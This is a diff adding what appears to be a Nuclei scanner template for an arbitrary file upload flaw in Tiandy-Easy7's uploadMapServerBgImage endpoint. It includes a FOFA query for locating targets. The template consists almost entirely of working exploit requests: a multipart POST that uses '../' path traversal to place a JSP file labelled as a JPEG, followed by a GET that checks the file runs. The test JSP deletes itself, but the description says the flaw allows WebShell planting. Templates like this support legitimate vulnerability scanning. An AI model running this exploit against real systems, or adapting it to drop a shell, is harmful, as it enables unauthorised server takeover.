@@ -1,0 +1,46 @@
+id: tiandy-easy7-uploadmapserverbgimage-upload
+
+info:
+  name: "Tiandy-Easy7 uploadMapServerBgImage 接口任意文件上传漏洞"
+  author: 0dayPoc
+  severity: high
+  description: |-
+    fofa: app="Tiandy-Easy7"
+      Tiandy-Easy7系统在uploadMapServerBgImage接口实现中未正确校验文件上传参数，攻击者可构造恶意请求上传任意文件。该缺陷可能被利用实现WebShell植入或服务器控制，需通过app="Tiandy-Easy7"的fofa查询确认目标资产。
+  tags: Tiandy-Easy7
+
+flow: |
+  http(1) && http(2)
+
+http:
+- raw:
+  - |
+    POST /Easy7/rest/file/uploadMapServerBgImage HTTP/1.1
+    Host: {{Hostname}}
+    Accept-Encoding: gzip, deflate
+    Content-Type: multipart/form-data; boundary=----WebKitFormBoundaryFfJZ4PlAZBixjELj
+    Accept: */*
+    Connection: close
+
+    ------WebKitFormBoundaryFfJZ4PlAZBixjELj
+    Content-Disposition: form-data; name="uploadParams";
+
+    [{"path":"../Easy7/","name":"NTest.jsp"}]
+    ------WebKitFormBoundaryFfJZ4PlAZBixjELj
+    Content-Disposition: form-data; name="file"; filename="NTest.jsp"
+    Content-Type: image/jpeg
+
+    <% out.println("NdayTest"); new java.io.File(application.getRealPath(request.getServletPath())).delete(); %>
+    ------WebKitFormBoundaryFfJZ4PlAZBixjELj--
+- raw:
+  - |
+    GET /Easy7/NTest.jsp HTTP/1.1
+    Host: {{Hostname}}
+  matchers-condition: and
+  matchers:
+  - type: status
+    status: [200]
+  - type: word
+    part: body
+    words:
+    - 'NdayTest'
